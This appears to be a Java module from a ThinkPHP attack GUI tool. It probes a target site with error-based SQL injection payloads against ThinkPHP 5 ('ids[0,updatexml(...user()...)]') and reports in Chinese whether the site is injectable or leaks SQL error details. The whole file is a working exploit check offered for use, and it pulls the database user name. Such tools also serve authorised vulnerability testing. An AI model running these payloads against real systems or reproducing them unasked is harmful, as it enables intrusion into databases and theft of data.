package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Tp5_Sql implements Exploit{
    ConfigManager configManager=ConfigManager.getInstance();
    private List<String> payloadList=new ArrayList<>(Arrays.asList(
            "index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1",
            "public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
    ));

    @Override
    public void startScan(String url){

        verify(url);
    }

    private void verify(String url){

        for(String payload:payloadList){
            try{
                HttpURLConnection httpURLConnection= HttpRequestUtil.get(url+payload);
                BufferedReader bufferedReader;
                if(httpURLConnection.getResponseCode()>=400){
                    bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                }else{
                    bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                }
                String line ;
                while((line=bufferedReader.readLine())!=null){
                    if(line.contains("syntax error")){
                        configManager.appendToTextArea("[+] "+url+"   存在SQL注入   "+url+payload);
                        return;
                    } else if(line.contains("SQLSTATE")){
                        configManager.appendToTextArea("[+] "+url+"   敏感信息泄露");
                        return;
                    }
                }
            }catch (Exception e){
                System.out.println(e.getMessage());
            }
        }
        configManager.appendToTextArea("[-] "+url+"   不存在SQL注入");
    }

}
